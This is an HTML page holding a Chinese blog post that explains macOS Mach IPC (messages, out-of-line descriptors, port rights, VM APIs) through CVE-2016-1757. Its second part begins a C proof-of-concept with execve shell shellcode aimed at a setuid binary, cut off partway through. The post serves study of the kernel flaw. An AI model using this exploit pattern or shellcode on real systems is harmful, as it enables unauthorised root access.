@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="凌迟" />
+
+
+
+<meta name="description" content="自从涉及到内核的知识，其中的一些东西有些抽象，如果单单看某个概念，可能会觉得有点一头雾水，那么最好的办法就是通过一个例子来了解这些东西都做了什么事">
+<meta name="keywords" content="OSX,Mach,IPC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过cve-2016-1757浅谈Mach IPC">
+<meta property="og:url" content="http://Hello-Sherlock.github.io/2017/02/12/seven-BLOG/index.html">
+<meta property="og:site_name" content="凌迟">
+<meta property="og:description" content="自从涉及到内核的知识，其中的一些东西有些抽象，如果单单看某个概念，可能会觉得有点一头雾水，那么最好的办法就是通过一个例子来了解这些东西都做了什么事">
+<meta property="og:updated_time" content="2017-03-20T00:38:11.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="通过cve-2016-1757浅谈Mach IPC">
+<meta name="twitter:description" content="自从涉及到内核的知识，其中的一些东西有些抽象，如果单单看某个概念，可能会觉得有点一头雾水，那么最好的办法就是通过一个例子来了解这些东西都做了什么事">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="凌迟" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>通过cve-2016-1757浅谈Mach IPC | 凌迟</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">凌迟</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">好久不见，SherlockHolmes</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:hisherlock@icloud.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/Hello-Sherlock" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/IPC/">IPC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mach/">Mach</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mach-O/">Mach-O</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OSX/">OSX</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XNU/">XNU</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dyld/">dyld</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iOS/">iOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/macOS/">macOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mach-portal/">mach_portal</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ptrace/">ptrace</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sysctl/">sysctl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">好久不见,SherlockHolmes！</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">凌迟</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">凌迟</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">好久不见，SherlockHolmes</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:hisherlock@icloud.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Hello-Sherlock" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-seven-BLOG" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/02/12/seven-BLOG/" class="article-date">
+      <time datetime="2017-02-12T06:43:56.000Z" itemprop="datePublished">2017-02-12</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      通过cve-2016-1757浅谈Mach IPC
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IPC/">IPC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Mach/">Mach</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OSX/">OSX</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>自从涉及到内核的知识，其中的一些东西有些抽象，如果单单看某个概念，可能会觉得有点一头雾水，那么最好的办法就是通过一个例子来了解这些东西都做了什么事</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="第一部分—-基本概念"><a href="#第一部分—-基本概念" class="headerlink" title="第一部分—-基本概念"></a>第一部分—-基本概念</h2><blockquote>
+<p>原语是由若干个机器指令 构成的完成某种特定功能的一段程序，具有不可分割性，即原语的执行必须是连续的，在执行过程中不允许被中断</p>
+</blockquote>
+<p>在谈mach ipc之前我们先来讨论讨论mach的一些设计风格以及ipc的一些基础概念</p>
+<p>首先mach作为一个极简的内核，其主要功能就是要把所有的功能都移除内核，放在用户态中，这样mach就可以保持着极简的风格。mach设计最大的优点是没有在设计中像其他内核一样考虑多处理，内核中的大部分功能都是分离的组件通过消息的传递来执行，这样不同的组件就可以不用再同一个处理器上执行。</p>
+<h3 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h3><blockquote>
+<p>在mach中，所有的东西都是通过自己的对象来实现的，进程称为任务，线程和虚拟内存都可以称为对象，所有对象都有自己的属性</p>
+</blockquote>
+<p>说到消息，其实mach中最基本的概念就是消息，它是mach ipc的核心构建模块，是在两个端口之间传递的</p>
+<p>像在其他架构中，对象和对象之前的通信都是要有一个接口，而mach是通过消息传递的方式来实现对象间的通信，这就是mach特殊的地方。</p>
+<p>mach消息有简单与复杂之分，其实说白了就是不同字段的消息结构，复杂消息主要是通过消息头标志位的<code>MACH_MSGH_BITS_COMPLES</code>来确定的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">typedef struct</div><div class="line">&#123;</div><div class="line">  void*				address;</div><div class="line">#if !defined(__LP64__)</div><div class="line">  mach_msg_size_t       	size;</div><div class="line">#endif</div><div class="line">  boolean_t     		deallocate: 8;</div><div class="line">  mach_msg_copy_options_t       copy: 8;</div><div class="line">  unsigned int     		pad1: 8;</div><div class="line">  mach_msg_descriptor_type_t    type: 8;</div><div class="line">#if defined(__LP64__)</div><div class="line">  mach_msg_size_t       	size;</div><div class="line">#endif</div><div class="line">#if defined(KERNEL) &amp;&amp; !defined(__LP64__)</div><div class="line">  uint32_t          pad_end;</div><div class="line">#endif</div><div class="line">&#125; mach_msg_ool_descriptor_t;</div><div class="line"></div><div class="line">typedef struct</div><div class="line">&#123;</div><div class="line">  uint32_t			address;</div><div class="line">  mach_msg_size_t		count;</div><div class="line">  boolean_t     		deallocate: 8;</div><div class="line">  mach_msg_copy_options_t       copy: 8;</div><div class="line">  mach_msg_type_name_t		disposition : 8;</div><div class="line">  mach_msg_descriptor_type_t	type : 8;</div><div class="line">&#125; mach_msg_ool_ports_descriptor32_t;</div><div class="line"></div><div class="line">typedef struct</div><div class="line">&#123;</div><div class="line">  uint64_t			address;</div><div class="line">  boolean_t     		deallocate: 8;</div><div class="line">  mach_msg_copy_options_t       copy: 8;</div><div class="line">  mach_msg_type_name_t		disposition : 8;</div><div class="line">  mach_msg_descriptor_type_t	type : 8;</div><div class="line">  mach_msg_size_t		count;</div><div class="line">&#125; mach_msg_ool_ports_descriptor64_t;</div><div class="line"></div><div class="line">typedef struct</div><div class="line">&#123;</div><div class="line">  void*				address;</div><div class="line">#if !defined(__LP64__)</div><div class="line">  mach_msg_size_t		count;</div><div class="line">#endif</div><div class="line">  boolean_t     		deallocate: 8;</div><div class="line">  mach_msg_copy_options_t       copy: 8;</div><div class="line">  mach_msg_type_name_t		disposition : 8;</div><div class="line">  mach_msg_descriptor_type_t	type : 8;</div><div class="line">#if defined(__LP64__)</div><div class="line">  mach_msg_size_t		count;</div><div class="line">#endif</div><div class="line">#if defined(KERNEL) &amp;&amp; !defined(__LP64__)</div><div class="line">  uint32_t          pad_end;</div><div class="line">#endif</div><div class="line">&#125; mach_msg_ool_ports_descriptor_t;</div><div class="line"></div><div class="line">/*</div><div class="line"> * LP64support - This union definition is not really</div><div class="line"> * appropriate in LP64 mode because not all descriptors</div><div class="line"> * are of the same size in that environment.</div><div class="line"> */</div><div class="line">#if defined(__LP64__) &amp;&amp; defined(KERNEL)</div><div class="line">typedef union</div><div class="line">&#123;</div><div class="line">  mach_msg_port_descriptor_t		port;</div><div class="line">  mach_msg_ool_descriptor32_t		out_of_line;</div><div class="line">  mach_msg_ool_ports_descriptor32_t	ool_ports;</div><div class="line">  mach_msg_type_descriptor_t		type;</div><div class="line">&#125; mach_msg_descriptor_t;</div><div class="line">#else</div><div class="line">typedef union</div><div class="line">&#123;</div><div class="line">  mach_msg_port_descriptor_t		port;</div><div class="line">  mach_msg_ool_descriptor_t		out_of_line;</div><div class="line">  mach_msg_ool_ports_descriptor_t	ool_ports;</div><div class="line">  mach_msg_type_descriptor_t		type;</div><div class="line">&#125; mach_msg_descriptor_t;</div><div class="line">#endif</div></pre></td></tr></table></figure></p>
+<p>由以上代码可以看出，在复杂消息的描述符中出现了一些OOL(out-of-line)，他是mach消息的重要特性，允许添加各种数据的分散指针，这就相当于添加了好多通向对象的各种条件的管道，主要描述了要附加数据的地址和大小以及对数据的一些处理。</p>
+<p>mach消息的发送和接收主要是通过一个共同的API函数<code>mach_msg()</code>来实现，其中包含了<code>mach_msg_send()</code>和<code>mach_msg_receive()</code>等，而<code>mach_msg()</code>则调用了一个mach陷阱(<code>mach_msg_trap</code>相当于系统调用)，当mach在用户态时可以通过引发mach陷阱来切换到内核态继续完成mach_msg的相应工作。</p>
+<p>由于mach架构是一个标准的微内核架构，所以<code>mach_msg()</code>函数必须在发送者和接收者之间复制消息所在的内存，这样频繁的复制内存会带来很大的损耗，为了解决这个问题，XNU中会让让所有的内核组件共享同一个地址空间，这样消息在传递的过程中只需要传递其相应的指针就可以了。</p>
+<h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><p>说起ipc，除了消息，那就是端口了</p>
+<p>ipc设计中非常强大的一个特性就是可以通过复杂消息将端口从一个任务传递到另一个任务中，也可以将端口和权限从一个实体传到另一个实体，每一个端口都有自己的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">typedef natural_t mach_port_right_t;</div><div class="line">//发送</div><div class="line">#define MACH_PORT_RIGHT_SEND		((mach_port_right_t) 0)</div><div class="line">//接收</div><div class="line">#define MACH_PORT_RIGHT_RECEIVE		((mach_port_right_t) 1)</div><div class="line">//发送一次</div><div class="line">#define MACH_PORT_RIGHT_SEND_ONCE	((mach_port_right_t) 2)</div><div class="line">#define MACH_PORT_RIGHT_PORT_SET	((mach_port_right_t) 3)</div><div class="line">#define MACH_PORT_RIGHT_DEAD_NAME	((mach_port_right_t) 4)</div><div class="line">#define MACH_PORT_RIGHT_LABELH	        ((mach_port_right_t) 5)</div><div class="line">#define MACH_PORT_RIGHT_NUMBER		((mach_port_right_t) 6)</div></pre></td></tr></table></figure>
+<p>以上就是mach端口的一些权限，看字面意思就明白，其中重要的就是send和receive</p>
+<h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p>虚拟内存是Mac中提供的最重要的机制，虚拟内存主要分为两个层次，一个是虚拟内存层，一个是物理内存层。由于这里仅分析poc中用到的一些系统调用，关于虚拟内存详细的分析在这里就不再详细说明了</p>
+<p>Mach在用户层也提供了丰富的内存相关的API<br>在用户态，程序可以在vm_map_t层次调用API(这里只介绍部分，有兴趣可以看看mach_vm.h文件)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">kern_return_t mach_vm_region</div><div class="line">(</div><div class="line">	vm_map_t target_task,</div><div class="line">	mach_vm_address_t *address,</div><div class="line">	mach_vm_size_t *size,</div><div class="line">	vm_region_flavor_t flavor,</div><div class="line">	vm_region_info_t info,</div><div class="line">	mach_msg_type_number_t *infoCnt,</div><div class="line">	mach_port_t *object_name</div><div class="line">);</div><div class="line">kern_return_t mach_vm_allocate</div><div class="line">(</div><div class="line">	vm_map_t target,</div><div class="line">	mach_vm_address_t *address,</div><div class="line">	mach_vm_size_t size,</div><div class="line">	int flags</div><div class="line">);</div><div class="line">kern_return_t mach_vm_protect</div><div class="line">(</div><div class="line">	vm_map_t target_task,</div><div class="line">	mach_vm_address_t address,</div><div class="line">	mach_vm_size_t size,</div><div class="line">	boolean_t set_maximum,</div><div class="line">	vm_prot_t new_protection</div><div class="line">);</div><div class="line">kern_return_t mach_vm_read</div><div class="line">(</div><div class="line">	vm_map_t target_task,</div><div class="line">	mach_vm_address_t address,</div><div class="line">	mach_vm_size_t size,</div><div class="line">	vm_offset_t *data,</div><div class="line">	mach_msg_type_number_t *dataCnt</div><div class="line">);</div><div class="line">kern_return_t mach_vm_write</div><div class="line">(</div><div class="line">	vm_map_t target_task,</div><div class="line">	mach_vm_address_t address,</div><div class="line">	vm_offset_t data,</div><div class="line">	mach_msg_type_number_t dataCnt</div><div class="line">);</div><div class="line">kern_return_t mach_vm_map</div><div class="line">(</div><div class="line">	vm_map_t target_task,</div><div class="line">	mach_vm_address_t *address,</div><div class="line">	mach_vm_size_t size,</div><div class="line">	mach_vm_offset_t mask,</div><div class="line">	int flags,</div><div class="line">	mem_entry_name_port_t object,</div><div class="line">	memory_object_offset_t offset,</div><div class="line">	boolean_t copy,</div><div class="line">	vm_prot_t cur_protection,</div><div class="line">	vm_prot_t max_protection,</div><div class="line">	vm_inherit_t inheritance</div><div class="line">);</div></pre></td></tr></table></figure>
+<ul>
+<li><code>mach_vm_region</code><br>根据flavor，显示任务的虚拟映射在address出的虚拟内存区域的信息</li>
+<li><code>mach_vm_allocate</code><br>在map表示的虚拟内存中分配size个字节</li>
+<li><code>mach_vm_protect</code><br>将map表示的虚拟内存中从star到star+size范围的内存区域的保护级别设置为定义的最高级别</li>
+<li><code>mach_vm_read</code><br>从外部任务的内存中复制，从map表示的虚拟内存中的addr出读size到data中</li>
+<li><code>mach_vm_write</code><br>复制到外部任务的内存：将data复制到map表示的虚拟内存中的address处</li>
+<li><code>mach_vm_map</code><br>创建新的内存映射</li>
+</ul>
+<h2 id="第二部分—-cve-2016-1757分析"><a href="#第二部分—-cve-2016-1757分析" class="headerlink" title="第二部分—-cve-2016-1757分析"></a>第二部分—-cve-2016-1757分析</h2><p>cve-2016-1757主要是内核处理一个setuid程序时，当进程的端口还没有关闭时，父进程的端口可以控制子进程的端口从而对目标进程的内存作出修改，并利用目标进程的root权限进行shellcode</p>
+<p>这个漏洞逻辑比较简单，直接上poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &lt;mach/mach.h&gt;</div><div class="line">#include &lt;mach/mach_error.h&gt;</div><div class="line">#include &lt;mach/mach_vm.h&gt;</div><div class="line"></div><div class="line">#include &lt;servers/bootstrap.h&gt;</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">// execve(&quot;/bin/zsh&quot;, &#123;&quot;/bin/sh&quot;, 0&#125;, 0); // honest!</div><div class="line">char shellcode[] = &quot;\xe8\x09\x00\x00\x00\x2f\x62\x69\x6e\x2f\x7a\x73\x68\x00\x5f\x48&quot;</div><div class="line">                   &quot;\x31\xdb\x53\x57\x48\x89\xe6\x48\x31\xd2\xb8\x3b\x00\x00\x02\x0f&quot;</div><div class="line">                   &quot;\x05&quot;;</div><div class="line"></div><div class="line">char* service_name = &quot;task_deposit_service&quot;;</div><div class="line">char* suid_binary_path = &quot;/usr/sbin/traceroute6&quot;;</div><div class="line"></div><div class="line">typedef struct &#123;</div><div class="line">  mach_msg_header_t header;</div><div class="line">  mach_msg_body_t body;</div><div class="line">  mach_msg_port_descriptor_t port;</div><div class="line">&#125; task_msg_send_t;</div><div class="line"></div><div class="line">typedef struct &#123;</div><div class="line">  mach_msg_header_t header;</div><div class="line">  mach_msg_body_t body;</div><div class="line">  mach_msg_port_descriptor_t port;</div><div class="line">  mach_msg_trailer_t trailer;</div><div class="line">&#125; task_msg_recv_t;</div><div class="line"></div><div class="line">typedef struct &#123;</div><div class="line">  mach_msg_header_t header;</div><div class="line">&#125; ack_msg_send_t;</div><div class="line"></div><div class="line">typedef struct &#123;</div><div class="line">  mach_msg_header_t header;</div><div class="line">  mach_msg_trailer_t trailer;</div><div class="line">&#125; ack_msg_recv_t;</div><div class="line"></div><div class="line">void do_parent(mach_port_t service_port) &#123;</div><div class="line">  kern_return_t err;</div><div class="line"></div><div class="line">  // generate the page we want to write into the child:</div><div class="line">  //生成一页想要写入子进程的内存</div><div class="line">  mach_vm_address_t addr = 0;</div><div class="line">  err = mach_vm_allocate(mach_task_self(),</div><div class="line">                         &amp;addr,</div><div class="line">                         4096,</div><div class="line">                         VM_FLAGS_ANYWHERE);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    